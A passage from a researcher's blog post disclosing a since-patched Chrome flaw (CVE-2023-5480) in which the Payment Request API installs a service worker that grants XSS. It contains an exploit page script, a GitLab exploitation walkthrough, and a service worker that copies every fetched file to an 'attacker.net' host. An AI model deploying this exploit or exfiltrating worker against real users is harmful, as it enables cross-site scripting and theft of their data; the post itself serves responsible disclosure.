</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>(){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">BASE</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://example.com/download&#34;</span> <span style="color:#75715e">// PATH TO DOWNLOAD SCOPE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fileName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;payment-manifest.js&#39;</span> <span style="color:#75715e">// Name of payment manifest
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">PaymentRequest</span>(
</span></span><span style="display:flex;"><span>                [{ <span style="color:#a6e22e">supportedMethods</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">BASE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">fileName</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span> }],
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;order-123&#34;</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">total</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">label</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Total&#34;</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">amount</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">currency</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;USD&#34;</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1.00&#34;</span> },
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">show</span>().<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">paymentResponse</span>) =&gt; {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">paymentResponse</span>.<span style="color:#a6e22e">complete</span>(<span style="color:#e6db74">&#34;success&#34;</span>).<span style="color:#a6e22e">then</span>(() =&gt; {
</span></span><span style="display:flex;"><span>                });
</span></span><span style="display:flex;"><span>            }).<span style="color:#66d9ef">catch</span>((<span style="color:#a6e22e">e</span>) =&gt; {
</span></span><span style="display:flex;"><span>                    document.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">BASE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/C4T BuT S4D`</span>;
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>Upon the completion of the execution of this script, the victim will be redirected to the target domain, where the registered Service Worker will intercept the request (because after JIT installation, they don&rsquo;t get uninstalled). Consequently, we obtain XSS on the specified domain.</p>
<p>The video I submitted to Google (where I achieved XSS on a ngrok subdomain through my page on Yandex S3):
<img src="./output.gif" alt=""></p>
<h1 id="example-of-a-real-attack">Example of a real attack</h1>
<p>During a brief investigation, I immediately discovered instances of this attack being exploited on many popular resources. I won&rsquo;t specify them due to ethical considerations (as millions of users have not yet updated their Chrome-based browsers). However, I found a good example to demonstrate this attack and its limitations - Gitlab. Currently, it is impossible to reproduce the attack on the latest version of the service, but it was exploitable a year ago.</p>
<p>As an example, I will demonstrate the exploitation of XSS using this bug on Gitlab from a year ago:</p>
<ul>
<li>
<p>Create a GitLab repository with CI/CD runners (or use an existing one).</p>
<p><img src="./gitlab0.jpg" alt=""></p>
</li>
<li>
<p>Add your CI configuration to it, which creates an artifact with the necessary files</p>
<p><img src="./gitlab1.jpg" alt=""></p>
<p>In it, I download an archive from the resource under my control and unpack the data.</p>
</li>
<li>
<p>Verify that the data has indeed become accessible on the artifact page.</p>
<p><img src="./gitlab3.jpg" alt=""></p>
</li>
<li>
<p>Now the data files can be downloaded directly using links like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://5604-185-219-81-55.ngrok-free.app/root/test/-/jobs/13/artifacts/raw/payment-manifest.js
</span></span></code></pre></div><p>Where <code>test</code> is the repository identifier, and <code>13</code> is the artifact number</p>
</li>
<li>
<p>Insert this link into the exploit page provided in the previous section and place it on the resource under our control.</p>
<p><img src="./gitlab4.jpg" alt=""></p>
</li>
<li>
<p>We obtain the execution of our JavaScript code on the domain with our GitLab.</p>
<p><img src="./gitlab5.jpg" alt=""></p>
</li>
</ul>
<p>Currently, this doesn&rsquo;t work because GitLab returns artifacts with <code>Content-Type: text/plain</code>, because <code>Content-Type: text/javascript</code>  leading to a bypass of the CSP rule <code>script-src: self</code>. The registration of the Service Worker checks the Content-Type for valid JS Mime-Type.</p>
<p>Therefore, any resource that implements file upload/download functionality without rewriting the regular Mime-Type of the file is vulnerable.</p>
<h1 id="s3-buckets">S3 buckets</h1>
<p>Another good example is S3 buckets.</p>
<p>Amazon S3 (Simple Storage Service) is a cloud storage service provided by Amazon Web Services (AWS). S3 buckets are containers for storing files or data objects within Amazon S3.</p>
<p>By default, S3 buckets expose the Mime-Type based on the file extension during download.
In general, Register a service worker on a domain with an S3 bucket:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">handleRequest</span>(<span style="color:#a6e22e">event</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">attacker_url</span>  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://attacker.net?e=&#34;</span>;
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">url</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">response_copy</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">clone</span>();
</span></span><span style="display:flex;"><span>      
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sniffed_data</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">url</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>()}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fetch</span>(
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">attacker_url</span>,
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">sniffed_data</span>), 
</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>, 
</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>      )
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Response</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">response_copy</span>.<span style="color:#a6e22e">blob</span>(),{<span style="color:#a6e22e">status</span><span style="color:#f92672">:</span><span style="color:#ae81ff">200</span>})
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;fetch&#34;</span>,<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">event</span>) =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">respondWith</span>(<span style="color:#a6e22e">handleRequest</span>(<span style="color:#a6e22e">event</span>));    
</span></span><span style="display:flex;"><span>  });
</span></span></code></pre></div><p>This Service Worker will duplicate all files opened by the user to the attacker&rsquo;s server.</p>
<h1 id="communicating-with-google">Communicating with Google</h1>
<p>Many people will be interested in the chronology of my communication with Google, therefore:</p>
<ul>
<li>October 13, 2023, I discovered this flaw</li>
<li>October 14, 2023 (Saturday), I sent a message describing a flaw in Chrome VRP</li>
<li>On October 17, 2023, Google employees began investigations related to the problem</li>
<li>On October 18, the problem was completely resolved, the flaw was assigned a danger level of High</li>
<li>A patch was released on October 19</li>
<li>On October 26, Google valued my discovery at $16,000 ($15,000 for the vulnerability itself and $1,000 for identifying the version in which the vulnerability appeared)</li>
<li>On October 31, Chrome 119 was released, in which the flaw was fixed. It was assigned the ID <strong>CVE-2023-5480</strong></li>
</ul>
<p>I think that the Chromium security people acted very quickly. They also gave me fair compensation. Thanks to them for this.</p>
<h1 id="results">Results</h1>
<p>Several conclusions can be drawn from this story:</p>
<ul>
<li>Even at the level of web standards, errors can exist</li>
<li>Modern browsers implement many experimental/unpopular Web APIs</li>
<li>Open Source doesn&rsquo;t help. This flaw was in the public domain for 3 years, but they could not fix it. At the same time, it is quite simple to use (Unlike other bugs in Chromium, which are often binary)</li>
<li>The vulnerability would not have arisen if the developers had not added new functionality to ready-made concepts.</li>
</ul>

        </section>
        <div class="post-tags">
          
          
          
        </div>
      </div>

      
      
    </div>

    </article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/Slonser" rel="me" title="GitHub"><svg class="feather">
   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#github" />
</svg></a><a class="border"></a><a class="soc" href="https://twitter.com/slonser_" rel="me" title="Twitter"><svg class="feather">
   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#twitter" />
</svg></a><a class="border"></a><a class="soc" href="https://t.me/Slonser" rel="me" title="Telegram"><svg class="feather">
   <use href="/svg/feather-sprite.51cf5647cb1987f769b616558f2620fd9423d72058490231b391bf6aa3744b55.svg#telegram" />
</svg></a><a class="border"></a></div>
  <div class="footer-info">
    2025  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>

</div>
    </body>
</html>
